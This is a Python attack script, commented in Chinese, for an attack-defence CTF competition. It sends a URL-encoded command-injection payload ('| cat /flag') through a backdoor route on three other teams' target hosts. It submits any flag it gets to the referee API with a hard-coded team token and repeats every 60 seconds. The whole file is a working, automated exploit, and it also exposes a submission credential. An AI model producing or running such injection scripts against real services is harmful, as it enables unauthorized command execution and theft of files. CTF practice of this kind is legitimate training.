import requests
import urllib.parse
import time

# ================= 赛博军火库配置 =================
# 你截图中提供的其他队伍靶机地址（不包含你自己的）
TARGETS = [
    "pwqmtr134-1.awd112-1.ncc.nssctf.cn:81",
    "sfrana134-4.awd112-1.ncc.nssctf.cn:81",
    "tkedre134-3.awd112-1.ncc.nssctf.cn:81"
]

# 你的提交凭证
MY_TOKEN = "1754a59d-5054-4337-aa5b-544b73446a65"
SUBMIT_URL = "http://flag.awd112-1.ncc.nssctf.cn:8888/v1/submit/"

# Payload 构造: "| cat /flag" 进行 URL 编码，防止路由解析报错
PAYLOAD = urllib.parse.quote("| cat /flag")


# ==================================================

def submit_flag(flag, target):
    """向裁判机API提交Flag"""
    headers = {"Content-Type": "application/json"}
    data = {
        "token": MY_TOKEN,
        "pid": 134,  # 截图中提供的题目 ID
        "flag": flag.strip()
    }

    try:
        res = requests.post(SUBMIT_URL, json=data, timeout=3)
        resp_json = res.json()
        if resp_json.get("code") == 10000:
            print(f"[$$$] 漂亮！打下 {target}，提交 Flag 成功得分！")
        else:
            print(f"[!] {target} 的 Flag 提交失败: {resp_json.get('message')}")
    except Exception as e:
        print(f"[-] 提交裁判机异常: {e}")


def exploit():
    print("[*] 开始执行后门收割任务...")
    for target in TARGETS:
        # 组装攻击 URL，例如: http://xxxx:81/ls/%7C%20cat%20%2Fflag
        attack_url = f"http://{target}/ls/{PAYLOAD}"

        try:
            print(f"[*] 正在攻击: {target} ...")
            # 发送攻击请求
            r = requests.get(attack_url, timeout=5)
            flag = r.text.strip()

            # 判断返回的内容像不像 Flag（包含 NSSCTF 或者是一串较长的哈希）
            if flag and ("NSSCTF{" in flag or "flag{" in flag or len(flag) >= 30):
                print(f"[+] 获取成功! Flag: {flag[:20]}...")
                submit_flag(flag, target)
            else:
                print(f"[-] 未拿到 Flag。目标可能已打补丁，返回内容: {flag[:20]}")

        except requests.exceptions.RequestException as e:
            print(f"[-] 目标 {target} 连接失败，可能服务已宕机。")


if __name__ == "__main__":
    # AWD 轮次通常几分钟一轮，你可以套个 while 循环让它每轮自动打一次
    while True:
        exploit()
        print("[*] 本轮攻击结束，等待 60 秒后开启下一轮扫描...\n")
        time.sleep(60)